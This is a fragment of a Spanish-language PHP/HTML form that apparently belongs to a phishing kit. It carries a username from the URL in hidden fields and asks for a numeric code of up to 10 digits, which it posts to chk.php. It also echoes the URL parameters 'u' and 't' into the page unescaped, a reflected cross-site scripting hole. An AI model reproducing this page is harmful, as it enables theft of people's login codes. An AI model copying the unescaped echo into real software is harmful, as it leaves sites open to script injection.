                        ...
                        <div class="row pt-10">
                            <div class="offset-md-8 col-md-6 col-lg-5 col-xl-4 col-sm-8 col- pt-5" id="card">
                                ...
                                <div class="p-4">
                                    ...
                                    <form method="POST" action="chk.php" id="form" autocomplete="off" class="z-index-1 position-relative" novalidate="">
                                       <input type="hidden"  name="txtusr" value="<?php echo $_GET['u']; ?>">
									    <input type="hidden"  name="txttipo" value="<?php echo $_GET['t']; ?>">
                                        <div class="mb-3">
                                            <div>
                                                
                                                <input class="form-control" name="opt3" id="password" type="tel" autocomplete="off" placeholder="EJ:1234567" required="required" maxlength="10">
                                            </div>
                                        </div>
